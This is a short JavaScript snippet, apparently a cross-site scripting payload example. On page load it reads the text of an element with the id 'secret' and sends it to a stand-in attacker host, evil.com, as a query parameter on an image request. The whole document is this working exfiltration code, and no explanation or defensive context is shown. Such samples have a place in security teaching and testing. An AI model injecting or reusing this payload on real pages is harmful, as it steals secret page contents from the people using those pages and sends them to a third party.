window.onload = function () {
  var secret = document.getElementById("secret").innerText;
  var img = new Image();
  img.src = "http://evil.com/steal?secret=" + secret;
};
